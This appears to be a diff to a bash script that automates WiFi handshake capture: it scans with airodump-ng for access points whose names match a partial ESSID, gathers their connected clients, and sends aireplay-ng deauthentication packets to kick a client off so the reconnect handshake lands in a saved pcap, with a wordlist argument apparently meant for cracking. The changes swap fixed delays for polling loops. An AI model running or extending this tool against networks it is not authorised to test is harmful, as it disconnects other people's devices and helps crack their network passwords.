@@ -16,40 +16,33 @@
 
 fapscan()
 {
-		clear
-		gnome-terminal --geometry=130x20 -x airodump-ng mon0 -w $HOME/tmp --output-format=csv&
-		$COLOR 2;echo "[*] Scanning for AP's with names like $PARTIALESSID [*]";$COLOR 9
-		sleep $SCN
-		killall airodump-ng
-		DONE=$( cat $HOME/tmp-01.csv | grep $PARTIALESSID ) 
-		if [ $DONE -z ] 2> /dev/null
-			then
-				echo
-				rm -rf $HOME/tmp*
-				$COLOR 1;echo " [*] Not Found [*]";$COLOR 9
-				$COLOR 4;echo " [*] Sleeping $SLP seconds..";$COLOR 9
-			else
-				csvtool col 4,14 $HOME/tmp-01.csv > $HOME/tmp3.csv
-				csvtool col 1,14 $HOME/tmp-01.csv > $HOME/tmp4.csv
-				
-				if [ $(cat $HOME/tmp3.csv | grep $PARTIALESSID | cut -c 2) = "," ] 2> /dev/null
-					then
-						CHAN=$(cat $HOME/tmp3.csv | grep $PARTIALESSID | cut -c 1)
-					else
-						CHAN=$(cat $HOME/tmp3.csv | grep $PARTIALESSID | cut -c 1-2)
-				fi
-				BSSID=$(cat $HOME/tmp4.csv | grep $PARTIALESSID | cut -c 1-17)
-				ESSID=$(cat $HOME/tmp4.csv | grep $PARTIALESSID | cut -d ',' -f 2)
-				fclientscan
-		fi
-		sleep $SLP
-		fapscan
+	clear
+	gnome-terminal --geometry=130x20 -x airodump-ng mon0 -w $HOME/tmp --output-format=csv&
+	$COLOR 2;echo "[*] Scanning for AP's with names like $PARTIALESSID [*]";$COLOR 9
+	while [ $DONE -z ] 2> /dev/null
+		do
+			DONE=$( cat $HOME/tmp-01.csv 2> /dev/null | grep $PARTIALESSID ) 
+		done
+
+	killall airodump-ng
+	csvtool col 4,14 $HOME/tmp-01.csv > $HOME/tmp3.csv
+	csvtool col 1,14 $HOME/tmp-01.csv > $HOME/tmp4.csv
+	
+	if [ $(cat $HOME/tmp3.csv | grep $PARTIALESSID | cut -c 2) = "," ] 2> /dev/null
+		then
+			CHAN=$(cat $HOME/tmp3.csv | grep $PARTIALESSID | cut -c 1)
+		else
+			CHAN=$(cat $HOME/tmp3.csv | grep $PARTIALESSID | cut -c 1-2)
+	fi
+	BSSID=$(cat $HOME/tmp4.csv | grep $PARTIALESSID | cut -c 1-17)
+	ESSID=$(cat $HOME/tmp4.csv | grep $PARTIALESSID | cut -d ',' -f 2)
+	fclientscan
+	sleep $SLP
+	fapscan
 }
 
 fclientscan()
 {
-	echo $BSSID
-	echo $CHAN
 	if [ ${BSSID:2:1} != ":" ] 2> /dev/null
 		then
 			rm -rf $HOME/tmp* 2> /dev/null
@@ -67,15 +60,14 @@ fclientscan()
 	echo
 	$COLOR 4;echo ' [*] Please wait while I gather active stations.. [*]';$COLOR 9
 	gnome-terminal --geometry=130x20 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
-	if [ $CHKBIT = 0 ] 2> /dev/null
-		then
-			sleep 7
-			CHKBIT=1
-		else
-			sleep 15
-	fi
-	killall airodump-ng
-	grep 'Station' -A 10 $HOME/tmp1-01.csv > $HOME/tmp
+	
+	DONE=""
+	while [ $DONE -z ] 2> /dev/null
+		do
+			DONE=$( cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 10 ) 
+		done
+	
+	echo "$DONE" > $HOME/tmp
 	while read LINE
 		do
 			if [ ${LINE:0:4} != "Stat" ] 2> /dev/null
@@ -89,14 +81,9 @@ fclientscan()
 			":")CNT=$(( CNT + 1 ));;
 			esac
 		done < $HOME/tmp1
-	if [ $CNT -lt 1 ]
-		then
-			$COLOR 1;echo " [*] No Clients found, retrying... [*]";$COLOR 9
-			sleep 1
-			fclientscan
-		else
-			fcap
-	fi
+	
+	killall airodump-ng
+	fcap
 }
 
 fcap()
@@ -119,7 +106,9 @@ fcap()
 	FILENAME="$ESSID"
 	FILENAME2=""$ESSID".cap"
 	gnome-terminal --geometry=130x20 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w "$HOME"/Desktop/hs/$FILENAME --output-format pcap&
-	$COLOR 1; echo " [*] DEAUTHING $CLIE";$COLOR 9
+	clear
+	echo
+	$COLOR 2;$COLOR2 1; echo " [*] DEAUTHING $CLIE";$COLOR 9;$COLOR2 9
 	echo
 	$COLOR 1;aireplay-ng -0 1 -a $BSSID -c $CLIE mon0;$COLOR 9
 	sleep 3
@@ -235,12 +224,9 @@ exit
 
 fstart()
 {
-CHKBIT=0
 COLOR="tput setab"
+COLOR2="tput setaf"
 CHKEX=1
-SLP=5
-SCN=10
-STATSC="0"
 MOND=$(ifconfig | grep mon0)
 mkdir -p $HOME/Desktop/hs
 
@@ -271,10 +257,8 @@ if [ $3 -z ] 2> /dev/null
 	else
 		WORDLIST=$3
 fi
-if [ $2 -z ] 2> /dev/null
+if [ ! -z $2 ] 2> /dev/null
 	then
-		GR=4S
-	else
 		MOND=$(ifconfig | grep mon0)
 		if [ $MOND -z ] 2> /dev/null
 			then
